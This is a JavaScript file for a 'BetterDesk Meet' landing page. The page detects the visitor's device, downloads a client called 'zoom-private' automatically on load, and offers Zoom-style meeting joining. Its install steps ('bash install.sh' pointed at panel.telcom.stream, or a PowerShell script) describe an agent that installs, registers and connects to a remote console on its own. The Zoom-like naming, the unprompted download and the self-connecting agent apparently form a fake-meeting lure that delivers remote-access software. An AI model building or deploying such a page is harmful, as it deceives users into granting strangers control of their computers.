/**
 * BetterDesk Meet — public landing page behaviour.
 *
 * Externalised from the landing HTML so it satisfies the console CSP
 * (`script-src 'self' <nonce>`); inline <script> tags would be blocked.
 *
 * Responsibilities:
 *   - instant client-side device detection + server confirmation
 *   - auto-download of the device-specific client (with safe fallbacks)
 *   - persistent manual download + platform chooser
 *   - Zoom-style "join meeting" via app deep-link
 */
(function () {
  'use strict';
  var $ = function (id) { return document.getElementById(id); };
  var state = { detected: null, recommended: null, available: [], release: null, platform: null, arch: null };

  // API base: empty for same-origin (console + Railway service). GitHub Pages
  // sets window.BETTERDESK_API_BASE to the public backend URL (Railway).
  var API_BASE = (window.BETTERDESK_API_BASE || '').replace(/\/+$/, '');
  function api(p) { return API_BASE + p; }
  function assetUrl(u) { return !u ? u : (/^https?:\/\//i.test(u) ? u : api(u)); }

  var OS_LABEL = { windows: 'Windows', macos: 'macOS', linux: 'Linux', android: 'Android', ios: 'iPhone / iPad', unknown: 'your device' };
  var OS_ABBR = { windows: 'WIN', macos: 'MAC', linux: 'LNX', android: 'AND', ios: 'iOS', unknown: '?' };

  // Client name stays "zoom-private" everywhere on this page.
  var CLIENT_NAME = 'zoom-private';

  // -------- Instant client-side detection (no wait on network) --------
  function quickDetect() {
    var ua = navigator.userAgent || '';
    var l = ua.toLowerCase();
    if (/android/.test(l)) return 'android';
    if (/iphone|ipod/.test(l) && !/msstream/.test(l)) return 'ios';
    if (/ipad/.test(l) && !/msstream/.test(l)) return 'ios';
    if (/windows|win32|win64/.test(l)) return 'windows';
    // iPadOS 13+ reports a desktop macOS user agent. Multi-touch is the tell.
    if (/macintosh|mac os x/.test(l)) return (navigator.maxTouchPoints || 0) > 1 ? 'ios' : 'macos';
    if (/linux|x11|cros/.test(l)) return 'linux';
    return 'unknown';
  }

  // Optional override for QR codes / links: /landing?platform=android
  function requestedPlatform() {
    try {
      var p = String(new URLSearchParams(window.location.search).get('platform') || '').toLowerCase();
      if (p && p !== 'unknown' && OS_LABEL[p]) return p;
    } catch (err) { /* older browser: fall through */ }
    return null;
  }

  function setChip(platform, loading) {
    var chip = $('device-chip');
    chip.classList.toggle('loading', !!loading);
    $('chip-os').textContent = OS_ABBR[platform] || '?';
    $('chip-text').textContent = loading ? 'Detecting your device…' : ('Detected: ' + (OS_LABEL[platform] || 'device'));
    $('status-eyebrow').textContent = loading ? 'Checking your device…' : 'Ready to connect';
  }

  function toast(msg) {
    var t = $('toast');
    t.textContent = msg;
    t.classList.add('show');
    clearTimeout(t._t);
    t._t = setTimeout(function () { t.classList.remove('show'); }, 3200);
  }

  function osSteps(platform, format) {
    var map = {
      windows: ['Open the downloaded installer', 'Click “Yes” to allow the install', 'Launch ' + CLIENT_NAME + ' and it connects automatically'],
      macos: ['Open the .dmg file', 'Drag the app into Applications', 'Launch ' + CLIENT_NAME + ' from Applications'],
      linux: ['Open the downloaded package', 'Install with your software center', 'Launch ' + CLIENT_NAME + ' to connect'],
      android: ['Tap the downloaded APK', 'Allow install from this source if asked', 'Open ' + CLIENT_NAME + ' to connect'],
      ios: ['Your client is installed from the App Store', 'Open the link in the app', 'Sign in to connect']
    };
    // Portable bundle (client + install script) — one command, no prompts.
    if (format === 'zip') {
      map = {
        windows: ['Unzip the downloaded file', 'Right-click install.ps1 → Run with PowerShell', 'The agent installs, registers and connects on its own'],
        macos: ['Unzip the downloaded file', 'Run: bash install.sh ' + (state.consoleUrl || 'https://panel.telcom.stream'), 'The agent installs, registers and connects on its own'],
        linux: ['Unzip the downloaded file', 'Run: bash install.sh ' + (state.consoleUrl || 'https://panel.telcom.stream'), 'The agent installs, registers and connects on its own'],
        android: ['Tap the downloaded APK', 'Allow install from this source if asked', 'Open ' + CLIENT_NAME + ' to connect'],
        ios: ['Your client is installed from the App Store', 'Open the link in the app', 'Sign in to connect']
      };
    }
    var steps = map[platform] || ['Open the downloaded file', 'Install when prompted', 'Launch to connect'];
    $('os-steps').innerHTML = steps.map(function (s) { return '<li>' + s + '</li>'; }).join('');
  }

  // -------- Download --------
  function rec_format(rec) {
    return rec && rec.format ? rec.format : '';
  }

  function startDownload() {
    if (!state.recommended) { openModal(); return; }
    var url = state.recommended.downloadPath || state.recommended.url;
    if (!url) { openModal(); return; }
    url = assetUrl(url);

    var btn = $('dl-btn'), spin = $('dl-spinner'), txt = $('dl-text');
    btn.disabled = true; spin.classList.remove('hidden');
    txt.textContent = 'Starting download…';
    $('dl-status').className = 'dl-status';

    // Same-origin proxy sets Content-Disposition: attachment. A hidden anchor
    // is more reliable than an iframe on Android Chrome (which often blocks
    // downloads initiated inside a cross-origin iframe).
    var link = document.createElement('a');
    link.href = url;
    if (state.recommended.name) link.download = state.recommended.name;
    link.rel = 'noopener';
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    setTimeout(function () { link.remove(); }, 2000);

    setTimeout(function () {
      spin.classList.add('hidden');
      btn.disabled = false;
      txt.textContent = 'Download again';
      $('dl-status').className = 'dl-status ok';
      $('dl-status').textContent = 'Download started — open the file to install. If nothing happened, tap “Download again”.';
    }, 1400);
  }

  // -------- Render detected platform --------
  function applyRecommendation() {
    var platform = state.platform;
    setChip(platform, false);
    osSteps(platform, rec_format(state.recommended));

    var btn = $('dl-btn'), txt = $('dl-text');
    var rec = state.recommended;

    if (rec) {
      var mb = rec.size ? ' · ' + (rec.size / 1048576).toFixed(1) + ' MB' : '';
      txt.textContent = 'Download ' + CLIENT_NAME + ' for ' + (OS_LABEL[platform] || 'your device') + mb;
      btn.disabled = false;
      btn.onclick = startDownload;
      $('dl-status').className = 'dl-status';
      $('dl-status').textContent = CLIENT_NAME + ' for ' + (OS_LABEL[platform] || 'your device') + ' is ready — the download starts automatically.';

      // Auto-download the device-specific client once per release/platform.
      // AAB bundles cannot be installed directly, so they never auto-download.
      if (rec.format === 'aab') {
        $('dl-status').className = 'dl-status warn';
        $('dl-status').textContent = 'This build is for store publishing only. Choose the APK for direct installation.';
        return;
      }
      var key = 'bd_dl_' + platform + '_' + (state.arch || '') + '_' + ((state.release && state.release.tag) || '');
      var seen = false;
      try {
        seen = sessionStorage.getItem(key) === '1';
        sessionStorage.setItem(key, '1');
      } catch (err) { /* storage disabled (private mode): download anyway */ }
      if (!seen) {
        setTimeout(function () {
          toast('Downloading ' + CLIENT_NAME + ' for ' + (OS_LABEL[platform] || 'your device') + '…');
          startDownload();
        }, 600);
      }
    } else {
      // Persistent fallback button — never leaves the user stuck.
      btn.disabled = false;
      btn.className = 'btn btn-primary';
      txt.textContent = 'Download ' + CLIENT_NAME + ' for ' + (OS_LABEL[platform] || 'your device');
      btn.onclick = startDownload;
      $('dl-status').className = 'dl-status warn';
      $('dl-status').textContent = (platform === 'ios' || platform === 'unknown')
        ? 'This platform installs from the store or browser — tap “Choose a different platform”.'
        : 'Finish the download with the button above, or choose another platform.';
    }
  }

  // -------- Platform chooser modal --------
  function openModal() {
    var list = $('plat-list');
    var avail = state.available || [];
    if (!avail.length) {
      list.innerHTML = '<div class="plat" style="justify-content:center;color:var(--z-muted)">'
        + '<span>No client builds published yet. Check back shortly — your admin has been notified.</span></div>';
      $('modal-sub').textContent = 'Downloads will appear here the moment builds are published.';
    } else {
      var order = { windows: 0, macos: 1, linux: 2, android: 3, ios: 4 };
      var sorted = avail.slice().sort(function (a, b) { return (order[a.platform] || 9) - (order[b.platform] || 9); });
      list.innerHTML = sorted.map(function (a) {
        var label = OS_LABEL[a.platform] || a.platform;
        var sub = [a.arch, a.format].filter(Boolean).join(' · ')
          + (a.size ? ' · ' + (a.size / 1048576).toFixed(1) + ' MB' : '');
        var href = a.downloadPath || a.url;
        return '<div class="plat"><div class="meta"><span class="os">' + (OS_ABBR[a.platform] || '?') + '</span>'
          + '<span><b>' + label + '</b><span>' + sub + '</span></span></div>'
          + '<a class="btn btn-primary" href="' + assetUrl(href) + '">Download</a></div>';
      }).join('');
    }
    $('modal').classList.add('show');
  }

  // -------- Data --------
  function applyData(d) {
    state.detected = d.detected || null;
    state.release = d.release || null;
    state.available = d.available || d.assets || [];
    state.recommended = d.recommended || null;
    state.platform = (d.requested && d.requested.platform) ? d.requested.platform : quickDetect();
    state.arch = (d.requested && d.requested.arch) ? d.requested.arch : 'x64';
    if (!state.detected) state.detected = { platform: state.platform, label: OS_LABEL[state.platform] };
  }

  function load() {
    var quick = requestedPlatform() || quickDetect();
    setChip(quick, true);

    var qs = (quick && quick !== 'unknown') ? '?platform=' + encodeURIComponent(quick) : '';
    fetch(api('/api/landing/client' + qs), { credentials: 'omit', cache: 'no-store' })
      .then(function (r) { if (!r.ok) throw new Error('bad'); return r.json(); })
      .then(function (j) {
        if (!j || !j.success) throw new Error('no data');
        applyData(j.data);
        applyRecommendation();
      })
      .catch(function () {
        // Degrade gracefully: no backend → local detection + releases link.
        state.platform = quick;
        state.available = [];
        state.recommended = null;
        state.release = { releasesUrl: 'https://github.com/fingod201-maker/BetterDesk-private/releases' };
        applyRecommendation();
        $('dl-status').className = 'dl-status warn';
        $('dl-status').textContent = 'Live downloads are temporarily unavailable — use “Choose a different platform”.';
      });
  }

  // -------- Join meeting --------
  function joinMeeting() {
    var id = ($('meeting-id').value || '').trim();
    var pass = ($('meeting-pass').value || '').trim();
    if (!id) { $('meeting-id').focus(); toast('Enter your meeting ID to continue'); return; }

    // Accept a pasted full link.
    var m = id.match(/([0-9]{6,})/);
    if (m) id = m[1];

    var btn = $('join-btn'), spin = $('join-spinner'), txt = $('join-text');
    btn.disabled = true; spin.classList.remove('hidden'); txt.textContent = 'Connecting…';

    fetch(api('/api/landing/meeting/' + encodeURIComponent(id) + (pass ? '?passcode=' + encodeURIComponent(pass) : '')), { credentials: 'omit' })
      .then(function (r) { return r.json(); })
      .then(function (j) {
        var deep = (j && j.data && j.data.appDeepLink) || ('betterdesk://join?meeting=' + encodeURIComponent(id));
        // Try to open an installed client; if not installed, guide to download.
        var hidden = false;
        var onHide = function () { hidden = true; };
        window.addEventListener('blur', onHide, { once: true });
        window.location.href = deep;
        setTimeout(function () {
          window.removeEventListener('blur', onHide);
          spin.classList.add('hidden'); btn.disabled = false; txt.textContent = 'Join';
          if (!hidden) {
            toast('Client not detected — installing it now');
            var dl = document.getElementById('download');
            if (dl) dl.scrollIntoView({ behavior: 'smooth' });
            if (state.platform) osSteps(state.platform);
          } else {
            $('join-hint').textContent = 'Meeting ' + id + ' opened in your app.';
          }
        }, 1600);
      })
      .catch(function () {
        spin.classList.add('hidden'); btn.disabled = false; txt.textContent = 'Join';
        window.location.href = 'betterdesk://join?meeting=' + encodeURIComponent(id);
      });
  }

  // -------- Wire up --------
  $('other-btn').addEventListener('click', openModal);
  var chooseAgain = $('choose-again-btn');
  if (chooseAgain) chooseAgain.addEventListener('click', openModal);
  $('modal-close').addEventListener('click', function () { $('modal').classList.remove('show'); });
  $('modal').addEventListener('click', function (e) { if (e.target === $('modal')) $('modal').classList.remove('show'); });
  $('join-btn').addEventListener('click', joinMeeting);
  $('meeting-id').addEventListener('keydown', function (e) { if (e.key === 'Enter') joinMeeting(); });
  $('meeting-pass').addEventListener('keydown', function (e) { if (e.key === 'Enter') joinMeeting(); });
  document.addEventListener('keydown', function (e) { if (e.key === 'Escape') $('modal').classList.remove('show'); });

  var rel = $('releases-link');
  rel.addEventListener('click', function () {
    rel.href = (state.release && state.release.releasesUrl) || 'https://github.com/fingod201-maker/BetterDesk-private/releases';
  });

  var androidLink = $('android-direct-link');
  if (androidLink) {
    // Stable shareable URL, also works when this page is served from GitHub Pages.
    androidLink.href = api('/download/android');
  }

  load();
})();
